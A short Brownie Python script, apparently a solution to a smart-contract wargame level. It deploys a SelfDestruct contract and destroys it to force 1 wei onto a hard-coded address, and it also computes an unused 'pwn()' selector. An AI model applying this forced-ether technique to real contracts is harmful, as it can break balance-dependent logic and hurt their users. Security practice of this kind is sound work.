from brownie import SelfDestruct, accounts, interface
from scripts.helpful_scripts import get_account
from web3 import Web3

sig = Web3.toHex(Web3.keccak(text="pwn()"))[0:10]


def main():
    account = get_account()
    cont = SelfDestruct.deploy(
        {"from": account},
    )
    cont.destroy(
        "0xdc9FC842b3BA659CaBA579c94E18a954347A4b8e", {"from": account, "value": 1}
    )
